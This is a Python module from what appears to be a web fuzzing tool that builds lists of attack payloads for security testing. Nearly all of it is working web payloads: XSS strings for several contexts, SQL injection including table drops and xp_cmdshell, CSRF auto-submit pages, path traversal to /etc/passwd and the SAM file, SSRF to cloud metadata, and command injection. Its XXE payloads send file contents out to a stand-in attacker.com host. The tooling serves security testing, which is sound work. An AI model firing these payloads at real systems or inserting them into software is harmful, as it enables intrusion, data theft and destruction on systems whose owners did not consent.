"""
Web Payload Generators for WebFuzzingBrain

Generates context-aware attack payloads for various web vulnerabilities.
Similar to binary blob generation in the original FuzzingBrain, but for web attacks.
"""

import random
import string
import base64
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass
from enum import Enum


class PayloadContext(Enum):
    """Context where payload will be injected"""
    HTML = "html"  # HTML body context
    ATTRIBUTE = "attribute"  # HTML attribute context
    JAVASCRIPT = "javascript"  # JavaScript code context
    URL = "url"  # URL parameter context
    CSS = "css"  # CSS context
    JSON = "json"  # JSON context
    XML = "xml"  # XML context


class SQLDatabase(Enum):
    """Database types for SQL injection"""
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    GENERIC = "generic"


@dataclass
class Payload:
    """Generated payload"""
    content: str
    context: PayloadContext
    vulnerability_type: str
    description: str
    expected_behavior: str


class PayloadGenerator:
    """
    Generates context-aware attack payloads for web vulnerability testing.

    Provides comprehensive payload generation for:
    - Cross-Site Scripting (XSS) - all contexts
    - SQL Injection - all database types
    - CSRF
    - Prototype Pollution
    - Path Traversal
    - XXE
    - SSRF
    - Command Injection
    """

    def __init__(self, logger=None):
        """Initialize payload generator"""
        self.logger = logger
        self.random_marker = self._generate_random_marker()

    def _generate_random_marker(self) -> str:
        """Generate random marker for detection"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

    def generate_xss_payloads(
        self,
        context: PayloadContext = PayloadContext.HTML,
        count: int = 5,
    ) -> List[Payload]:
        """
        Generate XSS payloads based on injection context.

        Args:
            context: Where the payload will be injected
            count: Number of payloads to generate

        Returns:
            List of XSS payloads
        """
        if context == PayloadContext.HTML:
            return self._generate_xss_html(count)
        elif context == PayloadContext.ATTRIBUTE:
            return self._generate_xss_attribute(count)
        elif context == PayloadContext.JAVASCRIPT:
            return self._generate_xss_javascript(count)
        elif context == PayloadContext.URL:
            return self._generate_xss_url(count)
        else:
            return self._generate_xss_html(count)

    def _generate_xss_html(self, count: int) -> List[Payload]:
        """Generate XSS payloads for HTML context"""
        base_payloads = [
            # Classic script tag
            f"<script>alert('XSS_{self.random_marker}')</script>",

            # Image onerror
            f"<img src=x onerror=alert('XSS_{self.random_marker}')>",

            # SVG
            f"<svg/onload=alert('XSS_{self.random_marker}')>",

            # Details/summary
            f"<details open ontoggle=alert('XSS_{self.random_marker}')>",

            # Body onload
            f"<body onload=alert('XSS_{self.random_marker}')>",

            # Iframe with javascript:
            f"<iframe src=javascript:alert('XSS_{self.random_marker}')>",

            # Object data
            f"<object data=javascript:alert('XSS_{self.random_marker}')>",

            # Embed src
            f"<embed src=javascript:alert('XSS_{self.random_marker}')>",

            # Form with autofocus
            f"<input autofocus onfocus=alert('XSS_{self.random_marker}')>",

            # Math with onload
            f"<math><mtext><mglyph><xss onload=alert('XSS_{self.random_marker}')>",
        ]

        payloads = []
        for i, payload_str in enumerate(base_payloads[:count]):
            payloads.append(Payload(
                content=payload_str,
                context=PayloadContext.HTML,
                vulnerability_type="XSS",
                description=f"HTML context XSS payload #{i+1}",
                expected_behavior=f"Alert box showing 'XSS_{self.random_marker}'",
            ))

        return payloads

    def _generate_xss_attribute(self, count: int) -> List[Payload]:
        """Generate XSS payloads for HTML attribute context"""
        base_payloads = [
            # Break out of attribute with event handler
            f"\" onload=alert('XSS_{self.random_marker}') \"",
            f"' onload=alert('XSS_{self.random_marker}') '",

            # Break out and add new attribute
            f"\" autofocus onfocus=alert('XSS_{self.random_marker}') x=\"",

            # SVG in attribute
            f"\"><svg/onload=alert('XSS_{self.random_marker}')>",

            # JavaScript protocol
            f"javascript:alert('XSS_{self.random_marker}')",

            # Data protocol
            f"data:text/html,<script>alert('XSS_{self.random_marker}')</script>",

            # Break with newline
            f"\"\n\nonload=alert('XSS_{self.random_marker}')\n\"",

            # Multiple quotes
            f"'''onload=alert('XSS_{self.random_marker}')'''",
        ]

        payloads = []
        for i, payload_str in enumerate(base_payloads[:count]):
            payloads.append(Payload(
                content=payload_str,
                context=PayloadContext.ATTRIBUTE,
                vulnerability_type="XSS",
                description=f"Attribute context XSS payload #{i+1}",
                expected_behavior=f"Break out of attribute and execute JavaScript",
            ))

        return payloads

    def _generate_xss_javascript(self, count: int) -> List[Payload]:
        """Generate XSS payloads for JavaScript context"""
        base_payloads = [
            # Break out of string with single quote
            f"';alert('XSS_{self.random_marker}');//",

            # Break out of string with double quote
            f"\";alert('XSS_{self.random_marker}');//",

            # Template literal
            f"`);alert('XSS_{self.random_marker}');//",

            # Comment out rest and inject
            f"*/alert('XSS_{self.random_marker}');//",

            # Multiple line breaks
            f"\n\nalert('XSS_{self.random_marker}')\n\n",

            # Unicode escape
            f"\\u0027;alert('XSS_{self.random_marker}');//",

            # Hex escape
            f"\\x27;alert('XSS_{self.random_marker}');//",
        ]

        payloads = []
        for i, payload_str in enumerate(base_payloads[:count]):
            payloads.append(Payload(
                content=payload_str,
                context=PayloadContext.JAVASCRIPT,
                vulnerability_type="XSS",
                description=f"JavaScript context XSS payload #{i+1}",
                expected_behavior=f"Break out of JavaScript context and execute alert",
            ))

        return payloads

    def _generate_xss_url(self, count: int) -> List[Payload]:
        """Generate XSS payloads for URL context"""
        base_payloads = [
            # JavaScript protocol
            f"javascript:alert('XSS_{self.random_marker}')",

            # Data URL
            f"data:text/html,<script>alert('XSS_{self.random_marker}')</script>",

            # VBScript (IE legacy)
            f"vbscript:alert('XSS_{self.random_marker}')",

            # File protocol
            f"file:///etc/passwd",

            # Mixed case to bypass filters
            f"JaVaScRiPt:alert('XSS_{self.random_marker}')",

            # URL encoded
            f"javascript%3Aalert('XSS_{self.random_marker}')",

            # Double encoded
            f"javascript%253Aalert('XSS_{self.random_marker}')",
        ]

        payloads = []
        for i, payload_str in enumerate(base_payloads[:count]):
            payloads.append(Payload(
                content=payload_str,
                context=PayloadContext.URL,
                vulnerability_type="XSS",
                description=f"URL context XSS payload #{i+1}",
                expected_behavior=f"Execute JavaScript via URL protocol",
            ))

        return payloads

    def generate_sqli_payloads(
        self,
        database: SQLDatabase = SQLDatabase.GENERIC,
        count: int = 5,
    ) -> List[Payload]:
        """
        Generate SQL injection payloads for specific database.

        Args:
            database: Target database type
            count: Number of payloads to generate

        Returns:
            List of SQL injection payloads
        """
        # Generic SQL injection payloads
        generic_payloads = [
            # Classic OR injection
            "' OR '1'='1",
            "' OR 1=1--",
            "\" OR 1=1--",

            # Union-based
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT version(),user(),database()--",

            # Blind SQL injection
            "' AND 1=1--",
            "' AND 1=2--",

            # Time-based blind
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",

            # Stacked queries
            "'; DROP TABLE users--",
            "'; INSERT INTO users VALUES('hacker','password')--",

            # Comment variations
            "' OR '1'='1' /*",
            "' OR '1'='1' #",
            "' OR '1'='1' -- -",

            # Boolean-based
            "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a",
        ]

        # Database-specific payloads
        db_specific = {
            SQLDatabase.MYSQL: [
                "' AND extractvalue(1, concat(0x3a, version()))--",
                "' UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables--",
                "' AND SLEEP(5)--",
            ],
            SQLDatabase.POSTGRESQL: [
                "'; SELECT pg_sleep(5)--",
                "' UNION SELECT NULL,current_database(),current_user--",
                "' AND 1=CAST((SELECT version()) AS int)--",
            ],
            SQLDatabase.MSSQL: [
                "'; WAITFOR DELAY '00:00:05'--",
                "' UNION SELECT @@version,NULL,NULL--",
                "'; EXEC xp_cmdshell('whoami')--",
            ],
            SQLDatabase.ORACLE: [
                "' UNION SELECT banner,NULL FROM v$version--",
                "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--",
                "' UNION SELECT table_name,NULL FROM all_tables--",
            ],
        }

        # Combine generic and database-specific
        if database in db_specific:
            all_payloads = generic_payloads + db_specific[database]
        else:
            all_payloads = generic_payloads

        payloads = []
        for i, payload_str in enumerate(all_payloads[:count]):
            payloads.append(Payload(
                content=payload_str,
                context=PayloadContext.HTML,  # Context doesn't matter for SQL
                vulnerability_type="SQLi",
                description=f"SQL injection payload #{i+1} for {database.value}",
                expected_behavior="Database error or data extraction",
            ))

        return payloads

    def generate_csrf_payloads(
        self,
        target_url: str,
        method: str = "POST",
        params: Optional[Dict[str, str]] = None,
        count: int = 5,
    ) -> List[Payload]:
        """
        Generate CSRF attack payloads.

        Args:
            target_url: Target endpoint URL
            method: HTTP method (GET, POST)
            params: Request parameters
            count: Number of payloads to generate

        Returns:
            List of CSRF payloads
        """
        params = params or {'action': 'delete', 'id': '123'}

        # HTML form auto-submit
        form_payload = f"""<html>
<body onload="document.forms[0].submit()">
<form action="{target_url}" method="{method}">
"""
        for key, value in params.items():
            form_payload += f'  <input type="hidden" name="{key}" value="{value}">\n'
        form_payload += """</form>
</body>
</html>"""

        # Image tag for GET CSRF
        img_payload = f'<img src="{target_url}?'
        img_payload += '&'.join([f'{k}={v}' for k, v in params.items()])
        img_payload += '">'

        # Fetch API
        fetch_payload = f"""<script>
fetch('{target_url}', {{
  method: '{method}',
  body: JSON.stringify({params}),
  credentials: 'include'
}});
</script>"""

        # XMLHttpRequest
        xhr_payload = f"""<script>
var xhr = new XMLHttpRequest();
xhr.open('{method}', '{target_url}', true);
xhr.withCredentials = true;
xhr.send(JSON.stringify({params}));
</script>"""

        # Form with iframe
        iframe_payload = f"""<iframe style="display:none" name="csrf_frame"></iframe>
<form action="{target_url}" method="{method}" target="csrf_frame" id="csrf_form">
"""
        for key, value in params.items():
            iframe_payload += f'  <input type="hidden" name="{key}" value="{value}">\n'
        iframe_payload += """</form>
<script>document.getElementById('csrf_form').submit();</script>"""

        all_payloads = [form_payload, img_payload, fetch_payload, xhr_payload, iframe_payload]

        payloads = []
        for i, payload_str in enumerate(all_payloads[:count]):
            payloads.append(Payload(
                content=payload_str,
                context=PayloadContext.HTML,
                vulnerability_type="CSRF",
                description=f"CSRF payload #{i+1}",
                expected_behavior=f"Force authenticated user to perform action on {target_url}",
            ))

        return payloads

    def generate_prototype_pollution_payloads(self, count: int = 5) -> List[Payload]:
        """
        Generate prototype pollution payloads.

        Args:
            count: Number of payloads to generate

        Returns:
            List of prototype pollution payloads
        """
        base_payloads = [
            # Direct __proto__ pollution
            '{"__proto__": {"polluted": "true"}}',

            # Constructor prototype
            '{"constructor": {"prototype": {"polluted": "true"}}}',

            # Nested pollution
            '{"a": {"__proto__": {"polluted": "true"}}}',

            # Array-based
            '{"__proto__": ["polluted"]}',

            # URL parameter based
            '__proto__[polluted]=true',

            # Multiple levels
            '{"__proto__": {"__proto__": {"polluted": "true"}}}',

            # With toString
            '{"__proto__": {"toString": "polluted"}}',

            # With valueOf
            '{"__proto__": {"valueOf": "polluted"}}',
        ]

        payloads = []
        for i, payload_str in enumerate(base_payloads[:count]):
            payloads.append(Payload(
                content=payload_str,
                context=PayloadContext.JSON,
                vulnerability_type="Prototype Pollution",
                description=f"Prototype pollution payload #{i+1}",
                expected_behavior="Pollute Object.prototype with attacker-controlled properties",
            ))

        return payloads

    def generate_path_traversal_payloads(self, count: int = 5) -> List[Payload]:
        """
        Generate path traversal payloads.

        Args:
            count: Number of payloads to generate

        Returns:
            List of path traversal payloads
        """
        base_payloads = [
            # Classic traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",

            # URL encoded
            "..%2F..%2F..%2Fetc%2Fpasswd",

            # Double encoded
            "..%252F..%252F..%252Fetc%252Fpasswd",

            # Null byte
            "../../../etc/passwd%00",

            # With absolute path
            "/etc/passwd",
            "C:\\windows\\system32\\config\\sam",

            # UTF-8 encoding
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",

            # Multiple encodings
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",

            # UNC path (Windows)
            "\\\\127.0.0.1\\c$\\windows\\system32\\config\\sam",
        ]

        payloads = []
        for i, payload_str in enumerate(base_payloads[:count]):
            payloads.append(Payload(
                content=payload_str,
                context=PayloadContext.URL,
                vulnerability_type="Path Traversal",
                description=f"Path traversal payload #{i+1}",
                expected_behavior="Access files outside intended directory",
            ))

        return payloads

    def generate_xxe_payloads(self, callback_url: Optional[str] = None, count: int = 5) -> List[Payload]:
        """
        Generate XXE (XML External Entity) payloads.

        Args:
            callback_url: URL to receive out-of-band data
            count: Number of payloads to generate

        Returns:
            List of XXE payloads
        """
        callback_url = callback_url or "http://attacker.com/xxe"

        base_payloads = [
            # Classic XXE
            """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>""",

            # XXE with parameter entity
            f"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{callback_url}">%xxe;]>
<root>test</root>""",

            # Blind XXE
            f"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "{callback_url}/evil.dtd">
%dtd;]>
<root>test</root>""",

            # XXE with UTF-16
            """<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>""",

            # XXE for SSRF
            f"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{callback_url}">]>
<root>&xxe;</root>""",
        ]

        payloads = []
        for i, payload_str in enumerate(base_payloads[:count]):
            payloads.append(Payload(
                content=payload_str,
                context=PayloadContext.XML,
                vulnerability_type="XXE",
                description=f"XXE payload #{i+1}",
                expected_behavior="Read local files or perform SSRF via XML processing",
            ))

        return payloads

    def generate_ssrf_payloads(self, count: int = 5) -> List[Payload]:
        """
        Generate SSRF (Server-Side Request Forgery) payloads.

        Args:
            count: Number of payloads to generate

        Returns:
            List of SSRF payloads
        """
        base_payloads = [
            # AWS metadata service
            "http://169.254.169.254/latest/meta-data/",

            # Localhost variations
            "http://localhost",
            "http://127.0.0.1",
            "http://[::1]",
            "http://0.0.0.0",

            # Internal network
            "http://192.168.0.1",
            "http://10.0.0.1",
            "http://172.16.0.1",

            # URL encoded
            "http://127.0.0.1%00.evil.com",

            # DNS rebinding
            "http://sudo.cc",

            # File protocol
            "file:///etc/passwd",

            # Dict protocol
            "dict://127.0.0.1:6379/INFO",

            # Gopher protocol
            "gopher://127.0.0.1:6379/_INFO",
        ]

        payloads = []
        for i, payload_str in enumerate(base_payloads[:count]):
            payloads.append(Payload(
                content=payload_str,
                context=PayloadContext.URL,
                vulnerability_type="SSRF",
                description=f"SSRF payload #{i+1}",
                expected_behavior="Make server perform requests to internal/external resources",
            ))

        return payloads

    def generate_command_injection_payloads(self, count: int = 5) -> List[Payload]:
        """
        Generate command injection payloads.

        Args:
            count: Number of payloads to generate

        Returns:
            List of command injection payloads
        """
        marker = self.random_marker

        base_payloads = [
            # Semicolon separator
            f"; echo {marker}",

            # Pipe
            f"| echo {marker}",

            # AND operator
            f"&& echo {marker}",

            # OR operator
            f"|| echo {marker}",

            # Backticks
            f"`echo {marker}`",

            # Command substitution
            f"$(echo {marker})",

            # Newline
            f"\necho {marker}\n",

            # With sleep for timing attacks
            "; sleep 5",

            # Multiple separators
            f"; echo {marker} #",
            f"& echo {marker} &",
        ]

        payloads = []
        for i, payload_str in enumerate(base_payloads[:count]):
            payloads.append(Payload(
                content=payload_str,
                context=PayloadContext.HTML,
                vulnerability_type="Command Injection",
                description=f"Command injection payload #{i+1}",
                expected_behavior=f"Execute arbitrary OS commands, output marker: {marker}",
            ))

        return payloads
